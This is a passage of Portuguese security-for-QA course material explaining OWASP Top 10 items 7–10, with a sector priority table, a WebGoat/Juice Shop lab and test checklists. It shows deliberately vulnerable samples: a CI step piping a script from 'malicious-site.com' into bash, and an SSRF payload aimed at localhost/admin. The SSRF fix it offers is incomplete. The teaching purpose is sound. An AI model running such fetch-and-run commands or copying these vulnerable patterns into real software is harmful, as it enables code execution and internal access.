- [ ] Testar força bruta (deve ter rate limiting)
- [ ] Verificar se sessões são invalidadas no logout
- [ ] Validar política de senhas (complexidade mínima)
- [ ] Testar se tokens não aparecem em URLs ou logs
- [ ] Verificar se MFA está implementado quando necessário

#### Prevenção

**Boas Práticas**:
1. **Senhas Fortes**: Política de senhas com complexidade adequada
2. **MFA**: Implementar autenticação de dois fatores quando possível
3. **Rate Limiting**: Limitar tentativas de login
4. **Gerenciamento de Sessão**: Invalidar sessões adequadamente
5. **Proteção de Credenciais**: Nunca expor em URLs ou logs

---

### 8. Software and Data Integrity Failures

#### Definição Técnica

**Software and Data Integrity Failures** ocorre quando software e dados críticos não são protegidos contra modificação não autorizada. Isso inclui falhas em CI/CD, atualizações não verificadas, e dados não protegidos contra alteração.

#### Exemplos Práticos

**Exemplo: CI/CD Não Verificado**

```yaml
# ❌ VULNERÁVEL - CI/CD sem verificação de integridade
# .github/workflows/deploy.yml
- name: Deploy
  run: |
    curl https://malicious-site.com/script.sh | bash
    # Executa script sem verificar assinatura!
```

```yaml
# ✅ SEGURO - Verificação de assinatura
- name: Deploy
  run: |
    # Verifica assinatura antes de executar
    gpg --verify script.sh.sig script.sh
    bash script.sh
```

#### Prevenção

**Boas Práticas**:
1. **Assinatura de Código**: Verificar assinaturas de binários e scripts
2. **CI/CD Seguro**: Verificar integridade de pipelines
3. **Verificação de Dados**: Validar integridade de dados críticos
4. **Backups Seguros**: Proteger backups contra modificação

---

### 9. Security Logging and Monitoring Failures

#### Definição Técnica

**Security Logging and Monitoring Failures** ocorre quando falhas de segurança não são detectadas adequadamente devido a logging ou monitoramento insuficiente.

#### Exemplos Práticos

**Exemplo: Logging Inadequado**

```python
# ❌ VULNERÁVEL - Sem logging de segurança
@app.route('/api/login', methods=['POST'])
def login():
    username = request.json['username']
    password = request.json['password']
    
    user = authenticate(username, password)
    if user:
        return {'token': generate_token(user)}
    else:
        return {'error': 'Invalid credentials'}, 401
    # Não registra tentativas de login falhadas!
```

```python
# ✅ SEGURO - Logging completo de segurança
import logging

security_logger = logging.getLogger('security')

@app.route('/api/login', methods=['POST'])
def login():
    username = request.json['username']
    password = request.json['password']
    ip_address = request.remote_addr
    
    user = authenticate(username, password)
    if user:
        security_logger.info(f"Successful login: {username} from {ip_address}")
        return {'token': generate_token(user)}
    else:
        # Log de tentativa falhada
        security_logger.warning(f"Failed login attempt: {username} from {ip_address}")
        return {'error': 'Invalid credentials'}, 401
```

#### Prevenção

**Boas Práticas**:
1. **Logging Completo**: Registrar eventos de segurança importantes
2. **Monitoramento em Tempo Real**: Alertas para atividades suspeitas
3. **Análise de Logs**: Ferramentas de SIEM para análise
4. **Retenção de Logs**: Manter logs por período adequado

---

### 10. Server-Side Request Forgery (SSRF)

#### 🎭 Analogia: O Mensageiro Enganado

Imagine um mensageiro que vai buscar encomendas baseado em endereços que você fornece.

**Cenário Normal**:
- Você pede: "Busque na loja da rua X"
- Mensageiro vai e busca ✅

**Cenário de Ataque (SSRF)**:
- Você pede: "Busque em localhost:8080/admin"
- Mensageiro vai e acessa servidor interno ❌
- Dados internos são expostos ❌

#### Definição Técnica

**Server-Side Request Forgery (SSRF)** ocorre quando um servidor web faz requisições HTTP para URLs fornecidas pelo cliente sem validação adequada, permitindo que atacantes façam o servidor acessar recursos internos ou externos não autorizados.

#### Exemplos Práticos

**Exemplo: SSRF em Funcionalidade de Preview**

```python
# ❌ VULNERÁVEL - SSRF possível
import requests

@app.route('/api/preview', methods=['POST'])
def preview_url():
    url = request.json['url']
    
    # Faz requisição sem validação
    response = requests.get(url)
    return response.text

# Ataque possível:
# POST /api/preview
# {"url": "http://localhost:8080/admin"}
# Resultado: Acessa recursos internos!
```

```python
# ✅ SEGURO - Validação de URL
import requests
from urllib.parse import urlparse

def is_internal_url(url):
    """Verifica se URL é interna (localhost, IPs privados)"""
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    # Bloqueia localhost
    if hostname in ['localhost', '127.0.0.1', '0.0.0.0']:
        return True
    
    # Bloqueia IPs privados
    if hostname.startswith('10.') or hostname.startswith('192.168.'):
        return True
    
    return False

@app.route('/api/preview', methods=['POST'])
def preview_url():
    url = request.json['url']
    
    # Validação
    if is_internal_url(url):
        return {'error': 'Invalid URL'}, 400
    
    # Whitelist de domínios permitidos
    allowed_domains = ['example.com', 'trusted-site.com']
    parsed = urlparse(url)
    if parsed.hostname not in allowed_domains:
        return {'error': 'Domain not allowed'}, 400
    
    response = requests.get(url, timeout=5)
    return response.text
```

#### Prevenção

**Boas Práticas**:
1. **Validação de URL**: Validar e sanitizar URLs fornecidas
2. **Whitelist de Domínios**: Permitir apenas domínios conhecidos
3. **Bloquear IPs Internos**: Não permitir acesso a localhost/IPs privados
4. **Network Segmentation**: Isolar recursos internos da rede pública

---

## 💼 Aplicação por Setor CWI

### Tabela Comparativa: Priorização de Vulnerabilidades por Setor

| Vulnerabilidade | Financeiro | Educacional | Ecommerce | Criticidade Geral |
|----------------|------------|-------------|-----------|------------------|
| **Broken Access Control** | 🔴 CRÍTICA | 🔴 CRÍTICA | 🔴 CRÍTICA | Acesso a contas/dados |
| **Cryptographic Failures** | 🔴 CRÍTICA | 🔴 CRÍTICA | 🔴 CRÍTICA | Dados sensíveis expostos |
| **Injection** | 🔴 CRÍTICA | 🟠 ALTA | 🔴 CRÍTICA | Vazamento de dados |
| **Insecure Design** | 🔴 CRÍTICA | 🟠 ALTA | 🔴 CRÍTICA | Fraudes e abusos |
| **Security Misconfiguration** | 🟠 ALTA | 🟠 ALTA | 🟠 ALTA | Superfície de ataque |
| **Vulnerable Components** | 🟠 ALTA | 🟡 MÉDIA | 🟠 ALTA | Exploits conhecidos |
| **Auth Failures** | 🔴 CRÍTICA | 🟠 ALTA | 🔴 CRÍTICA | Acesso não autorizado |
| **Data Integrity** | 🔴 CRÍTICA | 🟡 MÉDIA | 🟠 ALTA | Modificação de dados |
| **Logging Failures** | 🟠 ALTA | 🟡 MÉDIA | 🟠 ALTA | Detecção de ataques |
| **SSRF** | 🟠 ALTA | 🟡 MÉDIA | 🟡 MÉDIA | Acesso a recursos internos |

**Legenda**: 🔴 Crítica | 🟠 Alta | 🟡 Média

### Contexto Específico por Setor

#### Financeiro (Fintech, Open Banking)
- **Foco Principal**: Broken Access Control, Cryptographic Failures, Injection
- **Compliance**: PCI-DSS exige proteção rigorosa de dados de cartão
- **Casos CWI**: Implementação de validação rigorosa de acesso em APIs de Open Banking

#### Educacional (EdTech)
- **Foco Principal**: Broken Access Control (dados de menores), Cryptographic Failures
- **Compliance**: LGPD com requisitos especiais para dados de menores
- **Casos CWI**: Isolamento rigoroso de dados entre alunos e turmas

#### Ecommerce
- **Foco Principal**: Injection, Broken Access Control, Auth Failures
- **Riscos**: Fraudes, acesso a dados de pagamento, manipulação de preços
- **Casos CWI**: Validação de regras de negócio para prevenir fraudes

---

## 🧪 Laboratório Prático

### Setup do Ambiente

#### Opção 1: OWASP WebGoat
```bash
# Instalar Docker
# Executar WebGoat
docker run -d -p 8080:8080 webgoat/goatandwolf

# Acessar: http://localhost:8080
# Login: guest / guest
```

#### Opção 2: OWASP Juice Shop
```bash
# Executar Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# Acessar: http://localhost:3000
```

### Exercícios Práticos

#### Exercício 1: Identificar SQL Injection
1. Acesse OWASP WebGoat
2. Navegue até "Injection" → "SQL Injection (Intro)"
3. Tente injetar SQL em campos de entrada
4. Identifique qual campo é vulnerável
5. Documente o payload usado

#### Exercício 2: Explorar Broken Access Control
1. Acesse OWASP Juice Shop
2. Faça login como usuário comum
3. Tente acessar recursos administrativos
4. Identifique vulnerabilidades de acesso
5. Documente como corrigir

---

## 📊 Tabela de Referência Rápida

| # | Vulnerabilidade | Como Identificar | Como Prevenir | Ferramentas |
|---|----------------|------------------|---------------|-------------|
| 1 | Broken Access Control | Testar acesso direto a objetos | Validação de propriedade | Burp Suite, OWASP ZAP |
| 2 | Cryptographic Failures | Verificar hash de senhas, HTTPS | Hash seguro, HTTPS obrigatório | SSL Labs, Hash Analyzer |
| 3 | Injection | Tentar payloads de injection | Prepared statements | SQLMap, NoSQLMap |
| 4 | Insecure Design | Análise de arquitetura | Threat modeling | Microsoft TMT |
| 5 | Security Misconfiguration | Verificar headers, configurações | Hardening checklist | Security Headers |
| 6 | Vulnerable Components | Scanner de dependências | Atualizações regulares | Snyk, Dependabot |
| 7 | Auth Failures | Testar força bruta | Rate limiting, MFA | Burp Suite Intruder |
| 8 | Data Integrity | Verificar assinaturas | Validação de integridade | GPG, Code signing |
| 9 | Logging Failures | Verificar logs | Logging completo | ELK Stack, Splunk |
| 10 | SSRF | Testar URLs internas | Validação de URL | Burp Suite Collaborator |

---

## ✅ Checklist de Testes por Vulnerabilidade

### Broken Access Control
- [ ] Tentar acessar recursos de outros usuários
- [ ] Testar endpoints administrativos sem ser admin
- [ ] Verificar validação de propriedade
- [ ] Testar navegação forçada

### Cryptographic Failures
- [ ] Verificar hash de senhas (não texto plano)
- [ ] Confirmar HTTPS em todas as conexões
- [ ] Validar algoritmos de criptografia
- [ ] Verificar gerenciamento de chaves

### Injection
- [ ] Testar SQL Injection em todos os campos
- [ ] Tentar NoSQL Injection
- [ ] Testar Command Injection
- [ ] Validar uso de prepared statements

### Insecure Design
- [ ] Verificar rate limiting
- [ ] Testar validação de regras de negócio
- [ ] Validar isolamento de recursos
- [ ] Verificar autenticação forte

### Security Misconfiguration
- [ ] Verificar headers de segurança
- [ ] Testar mensagens de erro
- [ ] Validar configurações padrão
- [ ] Verificar serviços desnecessários

---

## 🔗 Referências Externas Validadas

### Documentação Oficial
- [OWASP Top 10 - 2021](https://owasp.org/Top10/) - Documentação oficial completa
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) - Guia de testes
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) - Cheat sheets por tópico

### Ferramentas
- [OWASP ZAP](https://www.zaproxy.org/) - Scanner de vulnerabilidades
- [Burp Suite](https://portswigger.net/burp) - Ferramenta de teste de segurança
- [SQLMap](https://sqlmap.org/) - Ferramenta de teste de SQL Injection
- [Snyk](https://snyk.io/) - Scanner de dependências vulneráveis

### Laboratórios Práticos
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Aplicação vulnerável para prática
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) - Aplicação vulnerável moderna
- [DVWA](http://www.dvwa.co.uk/) - Damn Vulnerable Web Application

### Artigos e Tutoriais
- [OWASP Top 10 Explained](https://owasp.org/www-project-top-ten/) - Explicações detalhadas
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Tutoriais práticos

---

## 🎯 Próximos Passos

Após dominar o OWASP Top 10, você estará preparado para:

- **Aula 1.3**: Shift-Left Security - Como integrar segurança desde o início
- **Aula 1.4**: Threat Modeling - Identificar ameaças proativamente
- **Aula 1.5**: Compliance e Regulamentações - LGPD, PCI-DSS, SOC2

---

**Duração da Aula**: 90 minutos  
**Nível**: Básico  
**Pré-requisitos**: Aula 1.1 (Introdução à Segurança em QA)
